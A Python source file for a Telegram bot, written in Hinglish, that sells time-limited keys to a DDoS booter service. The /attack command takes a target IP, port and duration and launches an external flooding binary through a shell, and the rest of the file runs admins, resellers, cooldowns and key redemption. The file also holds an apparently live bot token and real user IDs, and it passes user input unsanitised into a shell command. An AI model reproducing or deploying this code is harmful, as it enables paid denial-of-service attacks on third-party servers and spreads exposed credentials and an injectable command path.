import os
import json
import time
import random
import string
import telebot
import datetime
import subprocess
import threading
from dateutil.relativedelta import relativedelta
from telebot import types

# Bot Configuration
bot = telebot.TeleBot('7808978161:AAG0aidajxaCci9wSVqX6yTIqMBg9vVJIis')  # Replace with your bot token

# Overlord and Admin Setup
OVERLORD_IDS = {"6258297180": "@rahul_618", "1807014348": "@sadiq9869"}  # Overlords with full power
admin_id = set(OVERLORD_IDS.keys())  # Initial admin set with Overlords

# File Paths for Data Storage
USER_FILE = "users.json"
KEY_FILE = "keys.json"
BLOCKED_KEYS_FILE = "blocked_keys.json"
RESELLERS_FILE = "resellers.json"
ADMIN_FILE = "admins.json"
LOG_FILE = "log.txt"

# In-Memory Storage
users = {}
keys = {}
blocked_keys = {}
resellers = {}
admins = OVERLORD_IDS.copy()
last_attack_time = {}
COOLDOWN_PERIOD = 60  # Default cooldown in seconds

# Data Management Functions
def load_data():
    global users, keys, blocked_keys, resellers, admins
    users = read_users()
    keys = read_keys()
    blocked_keys = read_blocked_keys()
    resellers = read_resellers()
    admins = read_admins()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file, indent=4)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file, indent=4)

def read_blocked_keys():
    try:
        with open(BLOCKED_KEYS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_blocked_keys():
    with open(BLOCKED_KEYS_FILE, "w") as file:
        json.dump(blocked_keys, file, indent=4)

def read_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_resellers():
    with open(RESELLERS_FILE, "w") as file:
        json.dump(resellers, file, indent=4)

def read_admins():
    try:
        with open(ADMIN_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return OVERLORD_IDS.copy()

def save_admins():
    with open(ADMIN_FILE, "w") as file:
        json.dump(admins, file, indent=4)

def log_command(user_id, command, target=None, port=None, time=None):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        log_entry = f"[{datetime.datetime.now()}] Username: {username} | UserID: {user_id} | Command: {command}"
        if target: log_entry += f" | Target: {target}"
        if port: log_entry += f" | Port: {port}"
        if time: log_entry += f" | Time: {time}"
        log_entry += "\n"
        file.write(log_entry)

# Key and Time Functions
def create_key(suffix):
    characters = string.ascii_uppercase + string.digits
    random_part = ''.join(random.choice(characters) for _ in range(10))
    return f"Rahul-{suffix}-{random_part}"  # Rahul prefix compulsory

def add_time_to_date(duration_str):
    try:
        if 'h' in duration_str: return datetime.datetime.now() + relativedelta(hours=int(duration_str.replace('h', '')))
        if 'd' in duration_str: return datetime.datetime.now() + relativedelta(days=int(duration_str.replace('d', '')))
        if 'm' in duration_str: return datetime.datetime.now() + relativedelta(months=int(duration_str.replace('m', '')))
    except ValueError:
        return datetime.datetime.now() + relativedelta(seconds=1)  # Default fallback
    return datetime.datetime.now()

# Attack Execution
def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id):
    try:
        time_int = int(time)
        if time_int > 300:
            bot.send_message(chat_id, "⏰ *Bhai, max 300 seconds hi chalega! Overlord ka hukum!* 👑")
            return
        packet_size, threads = 1200, 512
        full_command = f"./Rohan {target} {port} {time}"
        response = f"🚀 *Attack Shuru Ho Gaya, Jaan! 🌩️*\nTarget: {target}:{port}\nTime: {time} seconds\nPacket Size: {packet_size} bytes\nThreads: {threads}\nAttacker: @{username}\n🎖️ *Overlord ka dum!*"
        bot.send_message(chat_id, response, parse_mode='Markdown')
        subprocess.Popen(full_command, shell=True)
        threading.Timer(time_int, lambda: bot.send_message(chat_id, "🎉 *Attack Khatam, King! Mission Accomplished! 😎*"), []).start()
        last_attack_time[user_id] = datetime.datetime.now()
        log_command(user_id, "attack", target, port, time)
    except Exception as e:
        bot.send_message(chat_id, f"❌ *Error: {str(e)}, Overlord se contact kar!*")

# Command Handlers
@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "😡 *BSDK, Yeh group mein nahi chalega! DM mein aa, Emperor!* 👑")
        return
    user_id = str(message.chat.id)
    role = "Overlord" if user_id in OVERLORD_IDS else "Admin" if user_id in admins else "Reseller" if user_id in resellers else "User" if user_id in users else "Guest"
    greeting = f"🌌 *Arre {role} {message.chat.first_name}, Kya Baat Hai, Jaan! 😍* 🌟\nWelcome to Overlord’s Cosmic Empire! /help dekh le, dil se!\n🎖️ *Overlord @rahul_618 & @sadiq9869 ne sab pe raj kiya!* 🙏"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Back to Menu", callback_data="back"), types.InlineKeyboardButton("Attack Now", callback_data="start_attack"))
    bot.reply_to(message, greeting, reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == "back")
def back(call):
    chat_id = call.message.chat.id
    bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔙 *Wapas Aa Gaya, Dilruba! 🌹*\n/help ya /start se shuruaat kar, Jaan!", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == "start_attack")
def process_attack_start(call):
    chat_id = call.message.chat.id
    bot.send_message(chat_id, "📡 *Bata, Jaan! IP Port Time daal: <ip> <port> <duration> (Max 300s)*")
    bot.register_next_step_handler(call.message, lambda m: process_attack_input(m, m.chat.username or "Unknown"))

@bot.message_handler(commands=['help'])
def help_command(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "😡 *DM mein aa, bhai! Yeh group ke liye nahi!*")
        return
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "🔒 *Bas Overlords/Admin ke liye, Jaan! DM mein @rahul_618 ya @sadiq9869 se pooch!*")
        return
    help_text = """
🌠 *Cosmic Empire Command Center, Jaan! 🌠*
────────────
- /start - Shuruaat kar, dil se! 😍
- /myinfo - Apna status check kar, King! 👑
- /attack <ip> <port> <time> - Dushman pe hamla, Overlord style! 🚀
- /gen <duration(h/d/m)> <devices> <keyname> - Key bana, jaan! (Overlord/Admin)
- /redeem <keyname> - Apni key use kar, Dilruba! 🔑
- /block <keyname> - Key block kar (Overlord only)! 🔒
- /add_admin <username>|<id> - Admin bana (Overlord only)! 🌟
- /remove_admin <username>|<id> - Admin hata (Overlord only)! 🌌
- /add_reseller <user_id> <balance> - Reseller add kar (Overlord/Admin)! 💰
- /remove_reseller <user_id> - Reseller hata (Overlord/Admin)! ❌
- /setcooldown <seconds> - Cooldown set kar (Overlord only)! ⏳
- /checkcooldown - Cooldown dekho, Jaan! ⏱️
────────────
*Example:* /gen 1d 1 Rahul-sadiq (1 day, 1 device)
🎉 *Overlord @rahul_618 & @sadiq9869 ki Jai Ho! Sab unki meherbaani se!* 🙏
"""
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Back", callback_data="back"))
    bot.reply_to(message, help_text, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['myinfo'])
def myinfo(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "😡 *DM mein aa, bhai! Yeh group ke liye nahi!*")
        return
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    role = "Overlord" if user_id in OVERLORD_IDS else "Admin" if user_id in admins else "Reseller" if user_id in resellers else "User" if user_id in users else "Guest"
    expiration = users.get(user_id, "N/A") if role == "User" else "Permanent" if role in ["Overlord", "Admin"] else str(resellers.get(user_id, 0)) + " Rs" if role == "Reseller" else "N/A"
    response = f"🌟 *{role} Info, Jaan!*\nUsername: @{username}\nUser ID: {user_id}\nRole: {role}\nExpiration/Balance: {expiration}\n🎖️ *Overlord ka aashirwad!*"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "😡 *DM mein aa, bhai! Group mein nahi chalega!*")
        return
    user_id = str(message.chat.id)
    if user_id not in (admin_id | set(users.keys())):
        bot.reply_to(message, "🔒 *Bas Overlords, Admins ya Users hi attack kar sakte hain, Jaan!*")
        return
    if user_id in users and datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        del users[user_id]
        save_users()
        bot.reply_to(message, "⚠️ *Tera access khatam ho gaya, Overlord se key le!*")
        return
    if user_id in last_attack_time and (datetime.datetime.now() - last_attack_time[user_id]).total_seconds() < COOLDOWN_PERIOD:
        remaining = int(COOLDOWN_PERIOD - (datetime.datetime.now() - last_attack_time[user_id]).total_seconds())
        bot.reply_to(message, f"⏳ *Thodi der ruk, Jaan! Cooldown: {remaining} seconds baki hai!*")
        return
    args = message.text.split()
    if len(args) == 1:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Launch Attack", callback_data="start_attack"), types.InlineKeyboardButton("Back", callback_data="back"))
        bot.reply_to(message, "🚀 *Hamla karne ka irada, Dilruba? Chuno!* 🌩️", reply_markup=markup)
    elif len(args) == 4:
        target, port, time = args[1], int(args[2]), int(args[3])
        execute_attack(target, port, time, message.chat.id, message.chat.username or "Unknown", last_attack_time, user_id)

def process_attack_input(message, username):
    chat_id = message.chat.id
    user_id = str(chat_id)
    try:
        ip, port, duration = message.text.split()
        if int(duration) > 300:
            bot.send_message(chat_id, "⏰ *Max 300 seconds hi, bhai! Overlord ka rule!*")
            return
        if user_id in last_attack_time and (datetime.datetime.now() - last_attack_time[user_id]).total_seconds() < COOLDOWN_PERIOD:
            remaining = int(COOLDOWN_PERIOD - (datetime.datetime.now() - last_attack_time[user_id]).total_seconds())
            bot.reply_to(message, f"⏳ *Ruk ja, Jaan! Cooldown: {remaining} seconds!*")
            return
        execute_attack(ip, int(port), int(duration), chat_id, username, last_attack_time, user_id)
    except ValueError:
        bot.send_message(chat_id, "❌ *Galat input, Dilruba! <ip> <port> <time> daal!*")

@bot.message_handler(commands=['gen'])
def gen_key(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "😡 *DM mein aa, bhai! Yeh group ke liye nahi!*")
        return
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "🔒 *Bas Overlords ya Admins hi key generate kar sakte hain, Jaan!*")
        return
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "Usage: /gen <duration(h/d/m)> <devices> <keyname>\nExample: /gen 1d 1 Rahul-sadiq")
        return
    duration, devices, keyname = args[1], int(args[2]), args[3]
    if user_id not in OVERLORD_IDS and devices > 1:
        bot.reply_to(message, "⚠️ *Ek se zyada devices? Sirf Overlord hi set kar sakta hai!*")
        return
    key = create_key(keyname)
    while key in keys or key in blocked_keys:
        key = create_key(keyname)
    expiration = add_time_to_date(duration).strftime('%Y-%m-%d %H:%M:%S')
    keys[key] = {"expiration": expiration, "devices": devices, "owner": user_id}
    save_keys()
    bot.reply_to(message, f"🔑 *Key Ban Gayi, Jaan!*\nKey: {key}\nExpires: {expiration}\nDevices Allowed: {devices}\n🎖️ *Overlord ka aashirwad!*", parse_mode='Markdown')
    log_command(user_id, "gen", keyname=keyname, time=duration)

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "😡 *DM mein aa, bhai! Yeh group ke liye nahi!*")
        return
    user_id = str(message.chat.id)
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /redeem <keyname>\nExample: /redeem Rahul-sadiq")
        return
    keyname = args[1]
    for key in list(keys.keys()):
        if key.startswith(f"Rahul-{keyname}-"):
            if key in blocked_keys:
                bot.reply_to(message, "❌ *Yeh key block hai, Jaan! Overlord se pooch!*")
                return
            if keys[key]["devices"] <= 0:
                bot.reply_to(message, "⚠️ *No devices left, Dilruba! Nayi key le!*")
                return
            if user_id in users and datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
                del users[user_id]
            users[user_id] = keys[key]["expiration"]
            keys[key]["devices"] -= 1
            if keys[key]["devices"] == 0:
                del keys[key]
            save_users()
            save_keys()
            bot.reply_to(message, f"✅ *Redeem Ho Gaya, Jaan!*\nKey: {key}\nExpires: {users[user_id]}\n🎖️ *Overlord ki meherbaani!*", parse_mode='Markdown')
            log_command(user_id, "redeem", keyname=keyname)
            return
    bot.reply_to(message, "❌ *Invalid ya Expired Key, Jaan! Phir try kar!*")

@bot.message_handler(commands=['block'])
def block_key(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "😡 *DM mein aa, bhai! Yeh group ke liye nahi!*")
        return
    user_id = str(message.chat.id)
    if user_id not in OVERLORD_IDS:
        bot.reply_to(message, "👑 *Bas Overlord @rahul_618 ya @sadiq9869 hi block kar sakte hain, Jaan!*")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /block <keyname>\nExample: /block Rahul-sadiq")
        return
    keyname = args[1]
    for key in list(keys.keys()):
        if key.startswith(f"Rahul-{keyname}-"):
            blocked_keys[key] = True
            if key in keys:
                del keys[key]
            save_blocked_keys()
            save_keys()
            bot.reply_to(message, f"🔒 *Key Block Ho Gayi, Overlord!*\nKey: {key}\n🎖️ *Teri wajah se empire safe hai!*", parse_mode='Markdown')
            log_command(user_id, "block", keyname=keyname)
            return
    bot.reply_to(message, "❌ *Yeh key nahi mili, Overlord! Phir check kar!*")

@bot.message_handler(commands=['add_admin'])
def add_admin(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "😡 *DM mein aa, bhai! Yeh group ke liye nahi!*")
        return
    user_id = str(message.chat.id)
    if user_id not in OVERLORD_IDS:
        bot.reply_to(message, "🚫 *Teri Aukaat Nahi Hai, Jaan! 👑\nBas Overlord @rahul_618 & @sadiq9869 hi admin bana sakte hain, Aukaat Mein Raho!*", parse_mode='Markdown')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /add_admin <username>|<id>\nExample: /add_admin @testuser or /add_admin 123456789")
        return
    target = args[1]
    try:
        if target.startswith('@'):
            user = bot.get_chat(target)
            target_id = str(user.id)
            admins[target_id] = {"username": target, "id": target_id}
        else:
            target_id = str(target)
            admins[target_id] = {"id": target_id}
        admin_id.add(target_id)
        save_admins()
        bot.reply_to(message, f"🌟 *Admin Ban Gaya, Overlord!*\n{target if target.startswith('@') else target_id}\n🎖️ *Teri wajah se empire grow karta hai!*", parse_mode='Markdown')
        log_command(user_id, "add_admin", target=target)
    except Exception as e:
        bot.reply_to(message, f"❌ *Galat Target Ya Error: {str(e)}, Jaan! Phir try kar!*")

@bot.message_handler(commands=['remove_admin'])
def remove_admin(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "😡 *DM mein aa, bhai! Yeh group ke liye nahi!*")
        return
    user_id = str(message.chat.id)
    if user_id not in OVERLORD_IDS:
        bot.reply_to(message, "🚫 *Teri Aukaat Nahi Hai, Jaan! 👑\nBas Overlord @rahul_618 & @sadiq9869 hi admin hata sakte hain, Aukaat Mein Raho!*", parse_mode='Markdown')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /remove_admin <username>|<id>\nExample: /remove_admin @testuser or /remove_admin 123456789")
        return
    target = args[1]
    try:
        if target.startswith('@'):
            user = bot.get_chat(target)
            target_id = str(user.id)
        else:
            target_id = str(target)
        if target_id in admins:
            admin_id.discard(target_id)
            del admins[target_id]
            save_admins()
            bot.reply_to(message, f"🌌 *Admin Hata Diya, Overlord!*\n{target if target.startswith('@') else target_id}\n🎖️ *Teri justice se empire safe!*", parse_mode='Markdown')
            log_command(user_id, "remove_admin", target=target)
        else:
            bot.reply_to(message, "❌ *Yeh admin nahi mila, Overlord! Check kar!*")
    except Exception as e:
        bot.reply_to(message, f"❌ *Galat Target Ya Error: {str(e)}, Jaan!*")

@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "😡 *DM mein aa, bhai! Yeh group ke liye nahi!*")
        return
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "🔒 *Bas Overlords ya Admins hi reseller add kar sakte hain, Jaan!*")
        return
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "Usage: /add_reseller <user_id> <balance>\nExample: /add_reseller 123456789 1000")
        return
    reseller_id, balance = args[1], int(args[2])
    if reseller_id in resellers:
        bot.reply_to(message, f"⚠️ *Yeh reseller pehle se hai! ID: {reseller_id}*")
        return
    resellers[reseller_id] = balance
    save_resellers()
    bot.reply_to(message, f"💰 *Reseller Ban Gaya, Jaan!*\nID: {reseller_id}\nBalance: {balance} Rs\n🎖️ *Overlord ki meherbaani!*", parse_mode='Markdown')
    log_command(user_id, "add_reseller", reseller_id=reseller_id)

@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "😡 *DM mein aa, bhai! Yeh group ke liye nahi!*")
        return
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "🔒 *Bas Overlords ya Admins hi reseller hata sakte hain, Jaan!*")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /remove_reseller <user_id>\nExample: /remove_reseller 123456789")
        return
    reseller_id = args[1]
    if reseller_id not in resellers:
        bot.reply_to(message, "❌ *Yeh reseller nahi mila, Jaan!*")
        return
    del resellers[reseller_id]
    save_resellers()
    bot.reply_to(message, f"❌ *Reseller Hata Diya, Jaan!*\nID: {reseller_id}\n🎖️ *Overlord ka faisla!*", parse_mode='Markdown')
    log_command(user_id, "remove_reseller", reseller_id=reseller_id)

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "😡 *DM mein aa, bhai! Yeh group ke liye nahi!*")
        return
    user_id = str(message.chat.id)
    if user_id not in OVERLORD_IDS:
        bot.reply_to(message, "👑 *Bas Overlord @rahul_618 ya @sadiq9869 hi cooldown set kar sakte hain, Jaan!*")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /setcooldown <seconds>\nExample: /setcooldown 120")
        return
    global COOLDOWN_PERIOD
    try:
        COOLDOWN_PERIOD = int(args[1])
        if COOLDOWN_PERIOD < 0:
            bot.reply_to(message, "⏳ *Negative cooldown nahi chalega, Jaan!*")
            return
        bot.reply_to(message, f"⏳ *Cooldown Set Ho Gaya, Overlord!*\nNew Cooldown: {COOLDOWN_PERIOD} seconds\n🎖️ *Teri wajah se system tight!*", parse_mode='Markdown')
        log_command(user_id, "setcooldown", time=COOLDOWN_PERIOD)
    except ValueError:
        bot.reply_to(message, "❌ *Galat input, Jaan! Number daal!*")

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "😡 *DM mein aa, bhai! Yeh group ke liye nahi!*")
        return
    bot.reply_to(message, f"⏱️ *Current Cooldown, Jaan!*\n{COOLDOWN_PERIOD} seconds\n🎖️ *Overlord ka rule!*", parse_mode='Markdown')

if __name__ == "__main__":
    load_data()
    print("Bot Started! Running in background...")
    bot.polling(none_stop=True)